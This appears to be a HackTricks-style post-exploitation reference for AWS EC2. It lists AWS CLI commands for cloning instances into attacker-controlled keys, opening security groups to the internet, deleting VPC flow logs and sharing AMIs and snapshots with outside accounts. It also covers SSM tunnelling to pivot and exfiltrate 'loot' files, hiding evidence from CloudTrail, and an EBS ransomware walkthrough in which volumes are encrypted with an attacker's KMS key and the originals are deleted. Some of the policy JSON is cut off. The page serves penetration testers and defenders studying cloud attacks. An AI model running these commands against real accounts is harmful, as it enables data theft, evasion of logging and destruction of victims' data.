### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **duplicates inbound and outbound traffic for EC2 instances within a VPC** without the need to install anything on the instances themselves. This duplicated traffic would commonly be sent to something like a network intrusion detection system (IDS) for analysis and monitoring.\
An attacker could abuse this to capture all the traffic and obtain sensitive information from it:

### Copy Running Instance

Instances usually contain some kind of sensitive information. There are different ways to get inside (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc.md)). However, another way to check what it contains is to **create an AMI and run a new instance (even in your own account) from it**:

```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```

### EBS Snapshot dump

**Snapshots are backups of volumes**, which usually will contain **sensitive information**, therefore checking them should disclose this information.\
If you find a **volume without a snapshot** you could: **Create a snapshot** and perform the following actions or just **mount it in an instance** inside the account:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Even if you lock down an EC2 so no traffic can get out, it can still **exfil via DNS**.

- **VPC Flow Logs will not record this**.
- You have no access to AWS DNS logs.
- Disable this by setting "enableDnsSupport" to false with:

  `aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

An attacker could call API endpoints of an account controlled by him. Cloudtrail will log this calls and the attacker will be able to see the exfiltrate data in the Cloudtrail logs.

### Open Security Group

You could get further access to network services by opening ports like this:

```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```

### Privesc to ECS

It's possible to run an EC2 instance an register it to be used to run ECS instances and then steal the ECS instances data.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### Remove VPC flow logs

```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```

### SSM Port Forwarding

Required permissions:

- `ssm:StartSession`

In addition to command execution, SSM allows for traffic tunneling which can be abused to pivot from EC2 instances that do not have network access because of Security Groups or NACLs.
One of the scenarios where this is useful is pivoting from a [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) to a private EKS cluster.

> In order to start a session you need the SessionManagerPlugin installed: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Install the SessionManagerPlugin on your machine
2. Log in to the Bastion EC2 using the following command:

```shell
aws ssm start-session --target "$INSTANCE_ID"
```

3. Get the Bastion EC2 AWS temporary credentials with the [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) script
4. Transfer the credentials to your own machine in the `$HOME/.aws/credentials` file as `[bastion-ec2]` profile
5. Log in to EKS as the Bastion EC2:

```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```

6. Update the `server` field in `$HOME/.kube/config` file to point to `https://localhost`
7. Create an SSM tunnel as follows:

```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```

8. The traffic from the `kubectl` tool is now forwarded throug the SSM tunnel via the Bastion EC2 and you can access the private EKS cluster from your own machine by running:

```shell
kubectl get pods --insecure-skip-tls-verify
```

Note that the SSL connections will fail unless you set the `--insecure-skip-tls-verify ` flag (or its equivalent in K8s audit tools). Seeing that the traffic is tunnelled through the secure AWS SSM tunnel, you are safe from any sort of MitM attacks.

Finally, this technique is not specific to attacking private EKS clusters. You can set arbitrary domains and ports to pivot to any other AWS service or a custom application.

---

#### Quick Local ↔️ Remote Port Forward (AWS-StartPortForwardingSession)

If you only need to forward **one TCP port from the EC2 instance to your local host** you can use the `AWS-StartPortForwardingSession` SSM document (no remote host parameter required):

```bash
aws ssm start-session --target i-0123456789abcdef0 \
  --document-name AWS-StartPortForwardingSession \
  --parameters "portNumber"="8000","localPortNumber"="8000" \
  --region <REGION>
```

The command establishes a bidirectional tunnel between your workstation (`localPortNumber`) and the selected port (`portNumber`) on the instance **without opening any inbound Security-Group rules**.

Common use cases:

* **File exfiltration**
  1. On the instance start a quick HTTP server that points to the directory you want to exfiltrate:

     ```bash
     python3 -m http.server 8000
     ```

  2. From your workstation fetch the files through the SSM tunnel:

     ```bash
     curl http://localhost:8000/loot.txt -o loot.txt
     ```

* **Accessing internal web applications (e.g. Nessus)**

```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
  --document-name AWS-StartPortForwardingSession \
  --parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```

Tip: Compress and encrypt evidence before exfiltrating it so that CloudTrail does not log the clear-text content:

```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```


### Share AMI

```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```

### Search sensitive information in public and private AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel is a tool designed to **search for sensitive information within public or private Amazon Machine Images (AMIs)**. It automates the process of launching instances from target AMIs, mounting their volumes, and scanning for potential secrets or sensitive data.

### Share EBS Snapshot

```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```

### EBS Ransomware PoC

A proof of concept similar to the Ransomware demonstration demonstrated in the S3 post-exploitation notes. KMS should be renamed to RMS for Ransomware Management Service with how easy it is to use to encrypt various AWS services using it.

First from an 'attacker' AWS account, create a customer managed key in KMS. For this example we'll just have AWS manage the key data for me, but in a realistic scenario a malicious actor would retain the key data outside of AWS' control. Change the key policy to allow for any AWS account Principal to use the key. For this key policy, the account's name was 'AttackSim' and the policy rule allowing all access is called 'Outside Encryption'

                }
            }
        }
    ]
}
```

The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Now with the publicly accessible key to use. We can use a 'victim' account that has some EC2 instances spun up with unencrypted EBS volumes attached. This 'victim' account's EBS volumes are what we're targeting for encryption, this attack is under the assumed breach of a high-privilege AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Similar to the S3 ransomware example. This attack will create copies of the attached EBS volumes using snapshots, use the publicly available key from the 'attacker' account to encrypt the new EBS volumes, then detach the original EBS volumes from the EC2 instances and delete them, and then finally delete the snapshots used to create the newly encrypted EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

This results in only encrypted EBS volumes left available in the account.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Also worth noting, the script stopped the EC2 instances to detach and delete the original EBS volumes. The original unencrypted volumes are gone now.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Next, return to the key policy in the 'attacker' account and remove the 'Outside Encryption' policy rule from the key policy.

          "kms:GrantIsForAWSResource": "true"
        }
      }
    }
  ]
}
```

Wait a moment for the newly set key policy to propagate. Then return to the 'victim' account and attempt to attach one of the newly encrypted EBS volumes. You'll find that you can attach the volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

But when you attempt to actually start the EC2 instance back up with the encrypted EBS volume it'll just fail and go from the 'pending' state back to the 'stopped' state forever since the attached EBS volume can't be decrypted using the key since the key policy no longer allows it.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

This the python script used. It takes AWS creds for a 'victim' account and a publicly available AWS ARN value for the key to be used for encryption. The script will make encrypted copies of ALL available EBS volumes attached to ALL EC2 instances in the targeted AWS account, then stop every EC2 instance, detach the original EBS volumes, delete them, and finally delete all the snapshots utilized during the process. This will leave only encrypted EBS volumes in the targeted 'victim' account. ONLY USE THIS SCRIPT IN A TEST ENVIRONMENT, IT IS DESTRUCTIVE AND WILL DELETE ALL THE ORIGINAL EBS VOLUMES. You can recover them using the utilized KMS key and restore them to their original state via snapshots, but just want to make you aware that this is a ransomware PoC at the end of the day.
